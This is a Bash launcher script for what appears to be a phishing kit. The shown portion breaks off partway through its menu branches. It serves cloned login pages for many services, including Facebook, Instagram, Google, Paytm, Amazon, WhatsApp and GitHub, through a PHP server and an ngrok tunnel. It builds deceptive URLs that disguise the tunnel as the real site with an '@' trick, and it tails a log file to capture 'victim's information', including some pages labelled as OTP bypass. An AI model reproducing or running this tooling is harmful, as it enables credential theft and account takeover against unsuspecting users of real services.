#!/bin/bash
clear
#clolors
## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear

logo() {
	cat <<- EOF
		${ORANGE}                        wake up, Christian
		${ORANGE}                Lord God Jesus Christ L❤️.VE'S you
		${ORANGE}                     follow the white Pigeon.
		${ORANGE}                       knock, knock, knock,
		${ORANGE}                           🎲Man Of God. 
		${BLUE}           __                 _____ _____     _     _
		${BLUE}        __|  |___ ___ _ _ ___|     |  |  |___|_|___| |_
		${BLUE}       |  |  | -_|_ -| | |_ -|   --|     |  _| |_ -|  _|
		${BLUE}       |_____|___|___|___|___|_____|__|__|_| |_|___|_|
		${RED}                           ¯\_(ツ)_/¯
	EOF
}

menu() {
cat <<- EOF
		${GREEN} [01] Tiktok              [12] Linkedin-TFO    [23] Wordpress
		${GREEN} [02] Facebook-TFO        [13] Hotstar-TFO     [24] Snapchat-TFO 
		${GREEN} [03] Instagram-TFO       [14] Spotify-TFO     [25] Protonmail-TFO
		${GREEN} [04] Uber Eats-TFO       [15] Github-TFO      [26] Stackoverflow
		${GREEN} [05] OLA-TFO             [16] IPFinder        [27] ebay-TFO
		${GREEN} [06] Google-TFO          [17] Zomato-TFO      [28] Twitch-TFO
		${GREEN} [07] Paytm-TFO           [18] PhonePay-TFO    [29] Ajio-TFO
		${GREEN} [08] Netflix-TFO         [19] Paypal-TFO      [30] Cryptocurrency
		${GREEN} [09] Instagram-Followers [20] Telegram-TFO    [31] Mobikwik-TFO
		${GREEN} [10] Amazon-TFO          [21] Twitter-TFO     [32] Pinterest
		${GREEN} [11] WhatsApp-TFO        [22] Flipcart-TFO    [0] Exit
	EOF
      }
      logo
      echo""
      menu
                 echo ""
                 read -p $"${GREEN}[${WHITE}+${GREEN}]${CYAN} What Is Your Choice: ${WHITE}" option
         if [ $option = 01 ] || [ $option = 1 ]
                 then 
                           cd sites/ 
                           cd tiktok/
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                           php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link: %s${ORANGE}" https://www.tiktok.com-@$link
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           tail -f log.txt 

              break;
                  elif [ $option = 02 ] || [ $option = 2 ]
              then
                       cd sites/
                           cd facebook/         
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                           php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.facebook.com-@$link
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           tail -f log.txt 

                  break;
                  elif [ $option = 03 ] || [ $option = 3 ]
              then
                           cd sites/
                           cd instagram/
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                           php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.instagram.com-@$link
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           tail -f log.txt

                 break;
                 elif [ $option = 04 ] || [ $option = 4 ]
             then
                           cd sites/
                           cd UberEats-Phishing/
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                           php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.ubereats.com-@$link
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           tail -f log.txt 

                break;
                elif [ $option = 05 ] || [ $option = 5 ]
            then 
                           cd sites/
                           cd ola-otpbypass/
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                           php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.olacabs.com-@$link
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           tail -f log.txt
                 break;
                 elif [ $option = 06 ] || [ $option = 6 ]
             then
                           cd sites/
                           cd google-otp/
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                           php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://google.com-login-@$link
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
                           printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
                           echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           tail -f log.txt
                break;
                elif [ $option = 07 ] || [ $option = 7 ]
            then
                          cd sites/
                          cd phonepay/
                          echo
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}] 1.${WHITE}${ORANGE} Paytm Sign In..."${WHITE}
              echo
                          echo -ne "${GREEN}[${WHITE}+${GREEN}] 2.${WHITE}${ORANGE} Paytm Sign UP...\n"${WHITE}
                          echo 
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Enter Your Choice ${WHITE}(1 0r 2): " option1
                  if [ $option1 = 1 ] || [ $option1 = 01 ]
              then
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://paytm.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt 
                   else
                          cd signup/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://paytm.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt 
                fi
                 
                break;
                elif [ $option = 08 ] || [ $option = 8 ]
            then
                          cd sites/
                          cd Netflix/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.netflix.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt 
                break;
                
                elif [ $option = 09 ] || [ $option = 9 ]
            then
                          cd sites/
                          cd instafollow/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.instafollowerspro.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt 
                break;
                elif [ $option = 10 ] || [ $option = 10 ]
            then
                          cd sites/
                          cd amazonsign/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.amazon.in-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt
                break;
                elif [ $option = 11 ] || [ $option = 11 ]
            then
                          cd sites/
                          cd whatsapp-phishing/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.whatsapp.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt
                break;
                elif [ $option = 12 ] || [ $option = 12 ]
            then
                          cd sites/
                          cd Linkedin/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://in.linkedin.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt
                break;
                elif [ $option = 13 ] || [ $option = 13 ]
            then
                          cd sites/
                          cd Hotstar-otp-bypass/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.hotstar.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt 
                break;
                elif [ $option = 14 ] || [ $option = 14 ]
            then
                          cd sites/
                          cd spotify/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.spotify.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt  
                break;
                elif [ $option = 15 ] || [ $option = 15 ]
            then
                          cd sites/
                          cd github/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://github.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt 
                break;
                elif [ $option = 16 ] || [ $option = 16 ]
            then
                          cd sites/
                          cd ipfinder/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://google.com-login-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt 
                break;
                elif [ $option = 17 ] || [ $option = 17 ]
            then
               
                          cd sites/
                          cd Zomato-Phishing/
